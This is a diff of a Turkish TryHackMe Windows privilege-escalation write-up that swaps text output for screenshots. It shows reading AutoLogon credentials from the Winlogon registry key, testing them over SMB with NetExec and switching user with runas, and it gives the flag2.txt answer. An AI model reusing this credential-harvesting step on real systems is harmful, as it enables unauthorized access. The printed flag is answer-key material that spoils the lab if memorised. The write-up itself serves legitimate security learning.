@@ -136,14 +136,7 @@ winPEAS parolayı bulmuş ama kullanıcı adını göstermemiş. Bunun için do�
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
-Çıktı:
-
-```
-DefaultUserName    REG_SZ    notadmin
-DefaultPassword    REG_SZ    P@ssw0rd!
-AutoLogonSID       REG_SZ    S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1009
-LastUsedUsername   REG_SZ    notadmin
-```
+<img width="923" height="602" alt="autologon" src="https://github.com/user-attachments/assets/684a0ee2-53e4-4606-882e-cc4d4dd597fd" />
 
 Yani AutoLogon için kullanılan hesap `notadmin`, parolası da düz metin halinde registry'de duruyormuş. Bu, unutulmuş/yanlış yapılandırılmış otomatik oturum açma özelliklerinin ne kadar tehlikeli olabileceğine güzel bir örnek.
 
@@ -152,16 +145,16 @@ Yani AutoLogon için kullanılan hesap `notadmin`, parolası da düz metin halin
 Bilgileri doğrulamak için yine NetExec kullandım:
 
 ```bash
-nxc smb 10.10.XXX.XXX -u notadmin -p 'P@ssw0rd!' --shares
+nxc smb 10.113.128.72 -u notadmin -p 'P@ssw0rd!' --shares
 ```
+<img width="1328" height="190" alt="autologonsmbbilgileritest" src="https://github.com/user-attachments/assets/993202c2-7112-416e-b460-c5837ea7a838" />
 
 Doğru çıktı. Zaten RDP oturumum açık olduğu için yeni bir oturum açmak yerine mevcut shell üzerinden `runas` ile `notadmin` context'inde bir komut istemi başlattım:
 
 ```cmd
 runas /user:notadmin cmd.exe
 ```
-
-*(Buraya runas komutunun çalıştırıldığı ve parola girilen ekranın ss'i eklenecek)*
+<img width="1009" height="728" alt="notadmin" src="https://github.com/user-attachments/assets/111132dc-f0cd-4934-b916-229e71d42831" />
 
 Ardından:
 
@@ -169,11 +162,12 @@ Ardından:
 cd C:\Users\notadmin\Desktop
 type flag2.txt
 ```
-
 **Soru:** What are the contents of `flag2.txt`?
+
 **Cevap:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`
 
-*(Buraya flag2.txt dosyasının ss'i eklenecek)*
+<img width="958" height="344" alt="flag2" src="https://github.com/user-attachments/assets/0200e894-db6c-4301-a510-e5798c9c551c" />
+
 
 ---
 
